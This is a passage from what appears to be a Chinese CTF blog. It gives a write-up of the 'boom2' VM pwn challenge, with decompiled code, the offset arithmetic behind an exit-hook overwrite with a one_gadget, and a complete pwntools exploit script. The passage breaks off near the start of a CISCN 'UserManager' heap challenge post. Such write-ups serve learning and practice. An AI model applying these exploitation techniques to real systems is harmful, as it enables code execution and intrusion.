rax</span></span><br><span class="line">  __int64 *v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v21; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v24; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v25; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v26; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v27; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *buf; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  _QWORD *v30; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 *v31; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 *v32; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">void</span> **v33; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 *v34; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 CodeCount; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  _QWORD *v37; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v30 = <span class="built_in">malloc</span>(<span class="number">0x40000</span>uLL);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x40000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;MC execution system\nInput your code&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x120</span>uLL);</span><br><span class="line">  v34 = v30 + <span class="number">0x8000</span>;</span><br><span class="line">  v30 += <span class="number">0x7FFF</span>;</span><br><span class="line">  *v30-- = <span class="number">30LL</span>;</span><br><span class="line">  *v30 = <span class="number">13LL</span>;</span><br><span class="line">  v37 = v30--;</span><br><span class="line">  *v30-- = a1 - <span class="number">1</span>;</span><br><span class="line">  *v30 = a2 + <span class="number">1</span>;</span><br><span class="line">  v31 = v30 - <span class="number">1</span>;</span><br><span class="line">  *v31 = v37;</span><br><span class="line">  CodeCount = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                              &#123;</span><br><span class="line">                                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                  &#123;</span><br><span class="line">                                    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                    &#123;</span><br><span class="line">                                      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                      &#123;</span><br><span class="line">                                        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                        &#123;</span><br><span class="line">                                          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                          &#123;</span><br><span class="line">                                            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                            &#123;</span><br><span class="line">                                              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                              &#123;</span><br><span class="line">                                                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                                &#123;</span><br><span class="line">                                                  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                                                  &#123;</span><br><span class="line">                                                    <span class="keyword">if</span> ( ++CodeCount &gt; <span class="number">30</span> )<span class="comment">// 最多执行三十次指令</span></span><br><span class="line">                                                    &#123;</span><br><span class="line">                                                      code = <span class="number">30LL</span>;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                    <span class="keyword">else</span></span><br><span class="line">                                                    &#123;</span><br><span class="line">                                                      v3 = buf;<span class="comment">// 取code，buf自增</span></span><br><span class="line">                                                      buf += <span class="number">8</span>;</span><br><span class="line">                                                      code = *v3;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                    <span class="keyword">if</span> ( code )</span><br><span class="line">                                                      <span class="keyword">break</span>;</span><br><span class="line">                                                    v5 = buf;</span><br><span class="line">                                                    buf += <span class="number">8</span>;</span><br><span class="line">                                                    v35 = &amp;v34[*v5];<span class="comment">// 取v34附近的地址给v35</span></span><br><span class="line">                                                  &#125;</span><br><span class="line">                                                  <span class="keyword">if</span> ( code != <span class="number">1</span> )</span><br><span class="line">                                                    <span class="keyword">break</span>;</span><br><span class="line">                                                  v6 = buf;</span><br><span class="line">                                                  buf += <span class="number">8</span>;</span><br><span class="line">                                                  v35 = *v6;<span class="comment">// 直接给v35赋值</span></span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">if</span> ( code != <span class="number">6</span> )</span><br><span class="line">                                                  <span class="keyword">break</span>;</span><br><span class="line">                                                v32 = v31 - <span class="number">1</span>;</span><br><span class="line">                                                *v32 = v34;</span><br><span class="line">                                                v34 = v32;</span><br><span class="line">                                                v7 = buf;</span><br><span class="line">                                                buf += <span class="number">8</span>;</span><br><span class="line">                                                v31 = &amp;v32[-*v7];<span class="comment">// 取v32附近的地址给v31</span></span><br><span class="line">                                              &#125;</span><br><span class="line">                                              <span class="keyword">if</span> ( code != <span class="number">8</span> )</span><br><span class="line">                                                <span class="keyword">break</span>;</span><br><span class="line">                                              v33 = (v34 + <span class="number">1</span>);<span class="comment">// ？</span></span><br><span class="line">                                              v34 = *v34;</span><br><span class="line">                                              v8 = v33;</span><br><span class="line">                                              v31 = (v33 + <span class="number">1</span>);</span><br><span class="line">                                              buf = *v8;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">if</span> ( code != <span class="number">9</span> )</span><br><span class="line">                                              <span class="keyword">break</span>;</span><br><span class="line">                                            v35 = *v35;<span class="comment">// 用v35的值控制v35指针</span></span><br><span class="line">                                          &#125;</span><br><span class="line">                                          <span class="keyword">if</span> ( code != <span class="number">10</span> )</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                          v35 = *v35;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">if</span> ( code != <span class="number">11</span> )</span><br><span class="line">                                          <span class="keyword">break</span>;</span><br><span class="line">                                        v9 = v31++;</span><br><span class="line">                                        **v9 = v35;</span><br><span class="line">                                      &#125;</span><br><span class="line">                                      <span class="keyword">if</span> ( code != <span class="number">12</span> )</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                      v10 = v31++;</span><br><span class="line">                                      v11 = *v10;</span><br><span class="line">                                      *v11 = v35;</span><br><span class="line">                                      v35 = *v11;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">if</span> ( code != <span class="number">13</span> )</span><br><span class="line">                                      <span class="keyword">break</span>;</span><br><span class="line">                                    *--v31 = v35;<span class="comment">// 这里能用v35赋值给v31</span></span><br><span class="line">                                  &#125;</span><br><span class="line">                                  <span class="keyword">if</span> ( code != <span class="number">14</span> )</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                  v12 = v31++;</span><br><span class="line">                                  v35 |= *v12;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> ( code != <span class="number">15</span> )</span><br><span class="line">                                  <span class="keyword">break</span>;</span><br><span class="line">                                v13 = v31++;</span><br><span class="line">                                v35 ^= *v13;</span><br><span class="line">                              &#125;</span><br><span class="line">                              <span class="keyword">if</span> ( code != <span class="number">16</span> )</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                              v14 = v31++;</span><br><span class="line">                              v35 &amp;= *v14;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> ( code != <span class="number">17</span> )</span><br><span class="line">                              <span class="keyword">break</span>;</span><br><span class="line">                            v15 = v31++;</span><br><span class="line">                            v35 = *v15 == v35;</span><br><span class="line">                          &#125;</span><br><span class="line">                          <span class="keyword">if</span> ( code != <span class="number">18</span> )</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                          v16 = v31++;</span><br><span class="line">                          v35 = *v16 != v35;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( code != <span class="number">19</span> )</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                        v17 = v31++;</span><br><span class="line">                        v35 = *v17 &lt; v35;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> ( code != <span class="number">20</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                      v18 = v31++;</span><br><span class="line">                      v35 = *v18 &gt; v35;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( code != <span class="number">21</span> )</span><br><span class="line">                      <span class="keyword">break</span>;</span><br><span class="line">                    v19 = v31++;</span><br><span class="line">                    v35 = *v19 &lt;= v35;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( code != <span class="number">22</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  v20 = v31++;</span><br><span class="line">                  v35 = *v20 &gt;= v35;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( code != <span class="number">23</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v21 = v31++;</span><br><span class="line">                v35 = *v21 &lt;&lt; v35;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( code != <span class="number">24</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v22 = v31++;</span><br><span class="line">              v35 = *v22 &gt;&gt; v35;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( code != <span class="number">25</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v23 = v31++;</span><br><span class="line">            v35 += *v23;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( code != <span class="number">26</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v24 = v31++;</span><br><span class="line">          v35 = *v24 - v35;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( code != <span class="number">27</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v25 = v31++;</span><br><span class="line">        v35 *= *v25;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( code != <span class="number">28</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v26 = v31++;</span><br><span class="line">      v35 = *v26 / v35;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( code != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v27 = v31++;</span><br><span class="line">    v35 = *v27 % v35;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( code == <span class="number">30</span> )</span><br><span class="line">    <span class="keyword">return</span> *v31;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面很多变量我没有改名是因为在复现过程中我只浅显的去分析了每个指令所起到的功能，而没有去更深入地分析这些变量是否在模拟某些寄存器，还是逆向基本功不足的问题，但是能把指令看懂也足够做出这题了。</p>
<p>程序一开始先malloc(0x40000)申请了两块在mmap段上的内存来保存指令以及后面会用到的空间，输入指令后就进入到后面嵌套的循环，这些循环有个很明显的特征就是其用if来判断code是否等于某个值，最后决定运行哪个while里的运算，这就很像<code>[OGeek2019 Final]OVM</code>这题，是一个code对应一个操作，同时因为取<code>code</code>的<code>v3</code>是int64，所以一个code对应八个字节。</p>
<p>然后从一些指令里就可以看出操作后面跟的是要操作的值，例如<code>p64(1) + p64(0x111)</code>，前面的1表示要执行的是<code>code = 1</code>对应的操作，后面的0x111就表示该操作中对应的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ( code != <span class="number">1</span> )</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">v6 = buf;</span><br><span class="line">buf += <span class="number">8</span>;</span><br><span class="line">v35 = *v6;<span class="comment">// 直接给v35赋值</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在前面的操作中指针<code>v31、v34、v30</code>等等都被赋值成了mmap段上的地址，所以在<code>code = 0</code>跟<code>code = 6</code>中的<code>v34</code>跟<code>v32</code>指针都是mmap段上的，也就是说其地址跟任意libc地址都有固定的偏移，同时<code>code = 0</code>是在给<code>v35</code>赋值，<code>code = 6</code>是在给<code>v31</code>赋值，而且<code>code = 13</code>可以直接把<code>v35</code>写进<code>--v31</code>指向的地址里，也就是说只要构造好<code>&amp;v32[-*v7]</code>跟<code>&amp;v34[*v5]</code>就可以完成任意libc地址写，因为程序最后通过main函数正常返回，所以我个人首先想到的是写exit_hook</p>
<h4 id="详细一点"><a href="#详细一点" class="headerlink" title="详细一点"></a>详细一点</h4><p>为了方便观看，先把<code>code = 0</code>、<code>code = 6</code>以及<code>code = 13</code>对应的指令贴在这</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code )</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">v5 = buf;</span><br><span class="line">buf += <span class="number">8</span>;</span><br><span class="line">v35 = &amp;v34[*v5];<span class="comment">// 取v34附近的地址给v35</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( code != <span class="number">6</span> )</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">v32 = v31 - <span class="number">1</span>;</span><br><span class="line">*v32 = v34;</span><br><span class="line">v34 = v32;</span><br><span class="line">v7 = buf;</span><br><span class="line">buf += <span class="number">8</span>;</span><br><span class="line">v31 = &amp;v32[-*v7];<span class="comment">// 取v32附近的地址给v31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( code != <span class="number">13</span> )</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">*--v31 = v35;<span class="comment">// 这里能用v35赋值给v31</span></span><br></pre></td></tr></table></figure>

<p>在某次动态调试过程中找到<code>v32</code>、<code>v34</code>、<code>&amp;__rtld_lock_unlock_recursive</code>以及某个one_gadget的具体地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;__rtld_lock_unlock_recursive = <span class="number">0x7f7265f85f68</span></span><br><span class="line">v32/v34 = <span class="number">0x7f7265f80fe8</span></span><br><span class="line">one_gadget = <span class="number">0x7F72659BB322</span></span><br></pre></td></tr></table></figure>

<p>从<code>code = 13</code>的指令就能知道我们需要把<code>v31</code>赋值成<code>&amp;__rtld_lock_unlock_recursive + 8</code>，把<code>v35</code>赋值成<code>one_gadget</code>。</p>
<p>观察一下就可以发现，<code>v32/v34</code>的地址高于<code>one_gadget</code>，低于<code>&amp;__rtld_lock_unlock_recursive </code>，结合<code>code = 0</code>以及<code>code = 6</code>的取偏移方式就知道我们需要通过整数溢出才能取到正确的地址。这个过程熟练的其实可以直接算出来，或者像我这种数学比较差的也可以结合汇编以及动态调试来完成。</p>
<p>首先将<code>v31</code>赋值成<code>&amp;__rtld_lock_unlock_recursive + 8</code>：</p>
<p>通过这部分的汇编就可以算出来</p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom2-1.jpg" class>

<p>就可以算出这部分：<code>~((&amp;__rtld_lock_unlock_recursive + 8 - v32)/8) = ~(0x4F88/8) = 0xFFFFFFFFFFFFF60E</code></p>
<p>所以这部分payload就是：<code>p64(0) + p64(0xFFFFFFFFFFFFF60E)</code></p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom2-2.jpg" class>

<p>可以看到<code>v31</code>指针已经被改成了<code>&amp;__rtld_lock_unlock_recursive + 8</code></p>
<p>然后将<code>v35</code>赋值成<code>one_gadget</code>：</p>
<p>这部分很简单：<code>(one_gadget - v34)/8 = 0xFFFFFFFFFFF47468</code></p>
<p>所以这部分的payload：<code>p64(6) + p64(0xFFFFFFFFFFF47468)</code></p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom2-3.jpg" class>

<p>但是可以注意到实际上取到的地址跟预期存在偏移（0x322），这是因为乘法时存在整数上溢导致的，而且这个地址是个坏字节</p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom2-4.jpg" class>

<p>所以稍微往低地址调整一下，取<code>0xFFFFFFFFFFF47467</code></p>
<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom2-5.jpg" class>

<img src="/2022/08/29/VMpwn/wdb_2020_1st_boom2-6.jpg" class>

<p>可以看到取到的地址变成了一个正常的指令，而且往下不会影响<code>execve</code>的执行</p>
<p>最后将<code>v35</code>赋值给<code>*--v31</code>即可，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./wdb_2020_1st_boom2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,26317)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&amp;__rtld_lock_unlock_recursive = 0x7f7265f85f68</span></span><br><span class="line"><span class="string">v32/v34 = 0x7f7265f80fe8</span></span><br><span class="line"><span class="string">one_gadget = 0x7F72659BB322</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rtld</span>(<span class="params">rtld,v32</span>):</span></span><br><span class="line">	rtld += <span class="number">8</span></span><br><span class="line">	offset = ~((rtld - v32)/<span class="number">8</span>)</span><br><span class="line">	offset /= <span class="number">8</span></span><br><span class="line">	<span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_og</span>(<span class="params">og,v34</span>):</span></span><br><span class="line">	offset = (og - v34)/<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xAB2)&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xA6B)&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xBAD)&#x27;)</span></span><br><span class="line">payload = p64(<span class="number">6</span>) + p64(<span class="number">0xFFFFFFFFFFFFF60E</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xFFFFFFFFFFF47467</span>) + p64(<span class="number">13</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Input your code&gt; &quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/24/2022CISCN%E5%86%B3%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/24/2022CISCN%E5%86%B3%E8%B5%9B/" class="post-title-link" itemprop="url">2022CISCN决赛</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-24 21:04:26" itemprop="dateCreated datePublished" datetime="2022-08-24T21:04:26+08:00">2022-08-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-26 20:47:43" itemprop="dateModified" datetime="2022-08-26T20:47:43+08:00">2022-08-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="UserManager"><a href="#UserManager" class="headerlink" title="UserManager"></a>UserManager</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>总的来说这题是常规的堆题</p>
<p>程序首先malloc了0x200大小的chunk用来保存后面申请的堆指针及其Content_size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_1329</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x12C</span>u);</span><br><span class="line">  Heap = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(Heap, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>菜单有add、delete、show</p>
<p>add如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-31h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *User_content; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *Passwd_content; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 User_len; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> Passwd_len; <span class="comment">// [rsp+28h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 index; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  index = ReadInt();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> || *(Heap + <span class="number">4</span> * index) || *(Heap + <span class="number">4</span> * index + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;illegal idx!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  SetUser(&amp;User_content, &amp;User_len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe you want to check username again?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%c&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">&#x27;Y&#x27;</span> || v1 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    Change_one(User_content, User_len);</span><br><span class="line">  SetPasswd(&amp;Passwd_content, &amp;Passwd_len);</span><br><span class="line">  *(Heap + <span class="number">4</span> * index) = User_content;</span><br><span class="line">  *(Heap + <span class="number">4</span> * index + <span class="number">1</span>) = User_len;</span><br><span class="line">  *(Heap + <span class="number">4</span> * index + <span class="number">2</span>) = 